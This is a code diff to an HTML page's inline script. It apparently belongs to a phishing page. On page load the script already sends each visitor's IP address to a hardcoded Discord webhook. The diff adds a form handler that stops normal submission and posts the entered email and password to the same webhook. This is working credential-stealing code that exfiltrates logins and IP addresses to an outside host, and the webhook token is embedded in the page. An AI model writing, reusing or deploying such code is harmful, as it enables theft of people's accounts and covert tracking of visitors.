@@ -35,24 +35,24 @@
     document.addEventListener("DOMContentLoaded", function() {
         const webhookURL = 'https://discord.com/api/webhooks/1317675684021141616/Wtj4pGo8HB6Z5I7qKVikcUQ-u_pyQXpjvFms5GfobcVb4t1K63mIYjcXzG8iz6JZECuR'; // Replace with your Discord webhook URL
 
-        // Automatically fetch the IP address on page load
+        // === 1. Automatically Log IP Address on Page Load ===
         fetch('https://api.ipify.org?format=json') // Fetch IP address using a public IP API
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;
 
-                // Prepare the data to send to Discord
-                const discordData = {
+                // Prepare the IP data to send to Discord
+                const ipData = {
                     content: `IP Address: ${userIP}`
                 };
 
-                // Send data to Discord webhook
+                // Send IP to Discord webhook
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(discordData)
+                    body: JSON.stringify(ipData)
                 })
                 .then(response => {
                     if (response.ok) {
@@ -68,8 +68,44 @@
             .catch(error => {
                 console.error('Error fetching IP address:', error);
             });
+
+        // === 2. Handle Form Submission ===
+        const form = document.querySelector('form');
+        if (form) {
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                const email = document.querySelector('input[name="email"]').value;
+                const password = document.querySelector('input[name="password"]').value;
+
+                // Prepare the form data to send to Discord
+                const formData = {
+                    content: `Email: ${email}\nPassword: ${password}`
+                };
+
+                // Send form data to Discord webhook
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Form data sent to Discord');
+                    } else {
+                        console.error('Error sending form data');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        }
     });
 </script>
+
 
 	
 </head>
